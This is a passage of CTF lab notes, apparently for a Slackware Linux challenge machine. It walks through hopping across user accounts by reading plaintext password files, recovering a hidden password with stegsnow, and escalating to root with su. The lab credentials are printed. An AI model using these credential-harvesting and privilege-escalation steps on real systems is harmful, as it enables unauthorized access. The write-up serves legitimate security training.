+h1dr0@slackware:/home$ cat catch_me75/mypass.txt
+Vkyo6rKvXsIw
+
+h1dr0@slackware:/home$ su catch_me75
+Password: 
+
+catch_me75@slackware:/home$ id
+uid=1045(catch_me75) gid=1045(catch_me75) groups=1045(catch_me75),1046(josemlwdf)
+catch_me75@slackware:/home$ cat josemlwdf/mypass.txt
+jLzXNEEFdtLX
+
+catch_me75@slackware:/home$ su josemlwdf
+Password: 
+
+josemlwdf@slackware:/home$ id
+uid=1046(josemlwdf) gid=1046(josemlwdf) groups=1046(josemlwdf),1047(skinny)
+josemlwdf@slackware:/home$ cat skinny/mypass.txt
+iJ7EnTBCtUS8
+
+josemlwdf@slackware:/home$ su skinny
+Password: 
+
+skinny@slackware:~$ id
+uid=1047(skinny) gid=1047(skinny) groups=1047(skinny)
+skinny@slackware:/home$ cd skinny
+skinny@slackware:~$ ls
+mypass.txt
+
+
+
+---seems like skinny is the last user of the chain, so we are done with searching the user directories---
+
+Note: We should find a way to automatize this process though
+
+
+
+---In the user flag file there is big empty space before the flag, I want to download that file and investigate
+it. To do so I will use scp command (remember from venus challanges)---
+
+
+                                                                                         
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/SLACKWARE LINUX CTF]
+└─# scp -P 1 rpj7@10.0.2.48:~/user.txt userflag.txt    
+
+(rpj7@10.0.2.48) Password: 
+user.txt                                               100%  314    61.9KB/s   00:00    
+                                                                
+
+
+
+---In order to find any hidden text in the file we can use stegsnow command---
+
+
+Stegsnow: It is a whitespace steganography program. It conceals messages in ASCII text by appending whitespaces
+to the end of lines, because spaces and tabs are generally not visible in text viewers to be hidden from
+casual observers.
+
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/SLACKWARE LINUX CTF]
+└─# stegsnow --help         
+Usage: stegsnow [-C] [-Q] [-S] [-V | --version] [-h | --help]
+	[-p passwd] [-l line-len] [-f file | -m message]
+	[infile [outfile]]
+               
+
+
+---let's use it with -C---
+
+
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/SLACKWARE LINUX CTF]
+└─# stegsnow -C userflag.txt
+To_Jest_Bardzo_Trudne_Haslo                                                                                         
+
+
+---The owner of the machine is kerszi,  this text is in polish so let's translate---
+
+
+To_Jest_Bardzo_Trudne_Haslo = This_Is_Very_Difficult_Password
+
+
+
+---let's go with polish and become root---
+
+
+
+
+				PRIVILEGE ESCALATION
+
+
+
+rpj7@slackware:~$ su root
+Password: 
+
+---now we are root, let's search for that flag--- 
+
+
+root@slackware:/home/rpj7# cd /root
+root@slackware:~# ls
+roo00oot.txt
+root@slackware:~# cat roo00oot.txt 
+There is no root flag here, but it is somewhere in the /home directory.
+
+
+---I ran find command but it's no use, lets use a different method---
+
+
+root@slackware:/home# grep -ri 'root'
+0xh3rshel/.screenrc:# Here is a flag for root: ---Root User Flag---
